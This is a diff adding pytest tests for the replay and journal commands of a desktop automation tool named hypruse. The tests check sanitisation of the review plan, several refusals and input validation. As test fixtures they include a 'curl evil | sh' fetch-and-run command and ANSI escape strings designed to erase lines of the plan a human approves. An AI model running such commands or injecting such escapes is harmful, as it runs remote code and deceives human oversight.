@@ -4,6 +4,7 @@ which is the same fail-toward-less-action rule the trust layers follow.
 """
 
 import json
+import os
 
 import pytest
 
@@ -39,7 +40,8 @@ def journal_file(tmp_path):
 def live(monkeypatch):
     """A desktop where the journal's windows still exist, and where
     replay's own startup does not touch the real machine."""
-    monkeypatch.setattr(cli, "_countdown", lambda s: None)
+    monkeypatch.setattr(cli, "_countdown", lambda s: True)
+    monkeypatch.setattr(cli, "_take_beacon", lambda: True)
     monkeypatch.setattr(srv.hyprctl, "query", lambda cmd: [{"address": "0xabc"}])
     from hypruse import safety, session
 
@@ -172,7 +174,7 @@ def test_execute_refuses_a_tool_this_version_does_not_have(tmp_path, live, calls
          "outcome": "ok", "ms": 1},
     ]))
     assert cli.replay([str(path), "--execute", "--yes"]) == 1
-    assert "cannot replay: teleport" in capsys.readouterr().out
+    assert "teleport (recorded by a newer hypruse)" in capsys.readouterr().out
     assert calls == []
 
 
@@ -261,3 +263,141 @@ def test_long_pauses_are_capped(journal_file, live, calls, monkeypatch):
     monkeypatch.setattr(cli.time, "sleep", lambda s: slept.append(s))
     cli.replay([str(journal_file), "--execute", "--yes", "--max-gap", "0.25"])
     assert slept and max(slept) <= 0.25
+
+
+# --- round-6 review: what the display and the seat must not do --------------
+
+
+def _one(tmp_path, **over):
+    entry = {"v": 1, "seq": 1, "ts": "2026-08-02T09:00:00.000Z", "kind": "act",
+             "tool": "pointer", "args": {"action": "click", "x": 1, "y": 1},
+             "outcome": "ok", "ms": 1}
+    entry.update(over)
+    path = tmp_path / "j.ndjson"
+    path.write_text(json.dumps(entry) + "\n")
+    return path
+
+
+ESCAPES = "harmless\x1b[2K\r      9  pointer action=click x=0 y=0\n\x1b[1A"
+
+
+def test_the_plan_cannot_erase_the_lines_above_it(tmp_path, live, capsys):
+    # the journal is written by the party being audited, and the printed
+    # plan is the only review a human gives before --execute
+    path = _one(tmp_path, tool="launch", args={"command": "curl evil | sh", "workspace": ESCAPES})
+    cli.replay([str(path)])
+    out = capsys.readouterr().out
+    assert "\x1b" not in out and "\r" not in out
+    assert "curl evil | sh" in out  # the real plan is still legible
+
+
+def test_the_journal_view_cannot_erase_lines_either(tmp_path, capsys):
+    path = _one(tmp_path, tool="launch", args={"command": ESCAPES})
+    cli.journal_cmd([str(path)])
+    assert "\x1b" not in capsys.readouterr().out
+
+
+def test_an_escape_in_an_error_or_a_result_is_stripped(tmp_path, capsys):
+    path = _one(tmp_path, outcome="refused", error=f"TrustError: {ESCAPES}")
+    cli.journal_cmd([str(path)])
+    assert "\x1b" not in capsys.readouterr().out
+
+
+def test_a_click_at_the_origin_still_shows_its_coordinates(tmp_path, live, capsys):
+    # 0 == False in Python, so the old "drop the falsy args" rule hid a
+    # click at (0, 0) entirely from the plan the human approves
+    path = _one(tmp_path, args={"action": "click", "x": 0, "y": 0})
+    cli.replay([str(path)])
+    assert "x=0 y=0" in capsys.readouterr().out
+
+
+def test_a_journal_whose_args_are_not_an_object_does_not_crash(tmp_path, live, capsys):
+    path = _one(tmp_path, args=["click", 1, 1])
+    assert cli.journal_cmd([str(path)]) == 0
+    assert cli.replay([str(path), "--execute", "--yes"]) == 1
+    assert "no recorded arguments" in capsys.readouterr().out
+
+
+def test_execute_refuses_under_dry_run(journal_file, live, calls, monkeypatch, capsys):
+    # every tool would return its "would have" plan and replay would
+    # report "replayed 2 actions" for input nobody received
+    monkeypatch.setenv("HYPRUSE_DRYRUN", "1")
+    assert cli.replay([str(journal_file), "--execute", "--yes"]) == 1
+    assert "HYPRUSE_DRYRUN is set" in capsys.readouterr().out
+    assert calls == []
+
+
+def test_a_replays_own_actions_are_marked_so_a_second_replay_skips_them(
+    journal_file, live, calls, monkeypatch
+):
+    monkeypatch.setattr(cli, "_take_beacon", lambda: False)
+    monkeypatch.setenv("HYPRUSE_JOURNAL", str(journal_file))
+    from hypruse import journal
+
+    monkeypatch.setattr(journal, "_seq", 100)
+    assert cli.replay([str(journal_file), "--execute", "--yes"]) == 0
+    calls.clear()
+    # the file now also holds this replay's own entries; replaying again
+    # must run the original two, not four
+    assert cli.replay([str(journal_file), "--execute", "--yes"]) == 0
+    assert [name for name, _ in calls] == ["pointer", "keyboard"]
+
+
+def test_replay_does_not_steal_a_running_servers_beacon(tmp_path, monkeypatch):
+    from hypruse import safety
+
+    state = tmp_path / "state.json"
+    state.write_text(json.dumps({"pid": os.getpid(), "started": 0, "last_action": ""}))
+    monkeypatch.setattr(safety, "state_path", lambda: state)
+    took = cli._take_beacon()
+    assert took is False
+    assert json.loads(state.read_text())["pid"] == os.getpid()  # untouched
+
+
+def test_replay_takes_the_beacon_when_the_pid_is_stale(tmp_path, monkeypatch):
+    from hypruse import safety
+
+    state = tmp_path / "state.json"
+    state.write_text(json.dumps({"pid": 999_999_999, "started": 0, "last_action": ""}))
+    monkeypatch.setattr(safety, "state_path", lambda: state)
+    monkeypatch.setattr(safety, "init", lambda: state.write_text('{"pid": 1}'))
+    assert cli._take_beacon() is True
+
+
+def test_a_clipboard_write_needs_the_same_opt_in_the_server_needs(tmp_path, live, calls, capsys,
+                                                                  monkeypatch):
+    monkeypatch.delenv("HYPRUSE_CLIPBOARD", raising=False)
+    path = _one(tmp_path, tool="clipboard", args={"action": "write", "text": "x"})
+    assert cli.replay([str(path), "--execute", "--yes"]) == 1
+    assert "HYPRUSE_CLIPBOARD=1" in capsys.readouterr().out
+
+
+def test_a_mark_click_is_refused_before_the_seat_is_taken(tmp_path, live, calls, capsys):
+    # marks live in the server process that drew them; a fresh replay has
+    # no numbering to resolve them against, and failing halfway would
+    # leave the desktop part-way through the plan
+    path = _one(tmp_path, tool="click_ui", args={"mark": 3})
+    assert cli.replay([str(path), "--execute", "--yes"]) == 1
+    assert "needs a live marks capture" in capsys.readouterr().out
+    assert calls == []
+
+
+def test_a_junk_duration_does_not_crash_the_pacing():
+    entry = {"ts": "2026-08-02T09:00:05.000Z", "ms": "later"}
+    assert cli._gap_before(entry, {"ts": "2026-08-02T09:00:00.000Z"}) == 0.0
+
+
+def test_a_nan_duration_does_not_reach_sleep():
+    entry = {"ts": "2026-08-02T09:00:05.000Z", "ms": float("nan")}
+    assert cli._gap_before(entry, {"ts": "2026-08-02T09:00:00.000Z"}) == 0.0
+
+
+def test_a_speed_of_zero_is_rejected(journal_file):
+    with pytest.raises(SystemExit):
+        cli.replay([str(journal_file), "--speed", "0"])
+
+
+def test_aborting_the_countdown_exits_cleanly(journal_file, live, calls, monkeypatch, capsys):
+    monkeypatch.setattr(cli, "_countdown", lambda s: False)
+    assert cli.replay([str(journal_file), "--execute"]) == 1
+    assert calls == []
